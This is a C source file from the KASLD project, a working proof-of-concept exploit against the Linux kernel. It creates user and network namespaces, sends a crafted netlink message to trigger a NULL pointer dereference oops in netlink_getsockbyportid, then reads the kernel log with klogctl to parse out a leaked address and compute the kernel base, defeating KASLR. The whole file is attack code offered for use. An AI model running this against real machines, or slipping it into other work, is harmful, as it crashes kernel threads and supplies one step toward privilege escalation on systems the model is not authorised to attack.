// This file is part of KASLD - https://github.com/bcoles/kasld
// Trigger kernel oops netlink_getsockbyportid null pointer deref and search syslog for splat
// Requires:
// - kernel.unprivileged_userns_clone = 1; (Default on Ubuntu systems)
// - kernel.dmesg_restrict = 0 (Default on Ubuntu systems); or CAP_SYSLOG capabilities.
// Based on original trigger PoC code by vn1k:
// - https://github.com/duasynt/meh/blob/master/nfnetlink1019.c

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <linux/netlink.h>

// https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
unsigned long KERNEL_BASE_MIN = 0xffffffff80000000ul;
unsigned long KERNEL_BASE_MAX = 0xffffffffff000000ul;

struct utsname get_kernel_version() {
  struct utsname u;
  if (uname(&u) != 0) {
    printf("[-] uname(): %m\n");
    exit(1);
  }
  return u;
}

int trigger_oops(void) {
  if (unshare(CLONE_NEWUSER) == -1) {
    printf("unshare(CLONE_NEWUSER): %m\n");
    return 1;
  }

  if (unshare(CLONE_NEWNET) == -1) {
    printf("unshare(CLONE_NEWNET): %m\n");
    return 1;
  }

  struct iovec iov[1];
  struct msghdr msg;

  memset(&msg, 0, sizeof(msg));
  memset(iov,  0, sizeof(iov));

  int buf[64];
  memset(buf, 0, sizeof(buf));

  int s = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);

  iov[0].iov_base = buf;
  iov[0].iov_len = 0xa0;
  buf[0] = 0xa0; // len 
  buf[1] = NLMSG_MIN_TYPE; // type
  msg.msg_iov    = iov;
  msg.msg_iovlen = 1;

  sendmsg(s, &msg, 0x40000);

  return 0;
}

#define SYSLOG_ACTION_READ_ALL 3
#define SYSLOG_ACTION_SIZE_BUFFER 10

int mmap_syslog(char** buffer, int* size) {
  *size = klogctl(SYSLOG_ACTION_SIZE_BUFFER, 0, 0);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_SIZE_BUFFER): %m\n");
    return 1;
  }

  *size = (*size / getpagesize() + 1) * getpagesize();
  *buffer = (char*)mmap(NULL, *size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  *size = klogctl(SYSLOG_ACTION_READ_ALL, &((*buffer)[0]), *size);

  if (*size == -1) {
    printf("[-] klogctl(SYSLOG_ACTION_READ_ALL): %m\n");
    return 1;
  }

  return 0;
}

unsigned long search_dmesg(char* needle) {
  char* syslog;
  int size;
  const int addr_len = 16; /* 64-bit */
  unsigned long addr = 0;

  if (mmap_syslog(&syslog, &size))
    return 0;

  char* substr = (char*)memmem(&syslog[0], size, needle, strlen(needle));
  if (substr == NULL)
    return 0;

  char *addr_buf;
  addr_buf = strstr(substr, "<ffffffff");
  if (addr_buf == NULL)
    return 0;

  char* endptr = &addr_buf[addr_len];
  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (addr > KERNEL_BASE_MIN && addr < KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main (int argc, char **argv) {
  printf("[.] trying netlink_unicast null pointer dereference ...\n");

  struct utsname u = get_kernel_version();

  if (strstr(u.machine, "64") == NULL) {
    printf("[-] unsupported: system is not 64-bit.\n");
    return 1;
  }

  if (system("grep -s -q 1 /proc/sys/kernel/panic_on_oops") == 0) {
    printf("kernel.panic_on_oops = 1. Aborted.\n");
    return 1;
  }

  pid_t rv;

  rv = fork();
  if (rv == -1) {
    printf("[-] fork(): %m\n");
    return 0;
  }

  if (rv == 0) {
    trigger_oops();
    return 0;
  }

  char *needle = "netlink_unicast";

  printf("[.] searching dmesg for %s ...\n", needle);

  unsigned long addr = search_dmesg(needle);
  if (!addr) return 1;

  printf("leaked address: %lx\n", addr);

  printf("kernel base (likely): %lx\n", addr & 0xffffffffff000000ul);
  printf("kernel base (likely): %lx\n", addr & 0xfffffffffff00000ul);

  return 0;
}

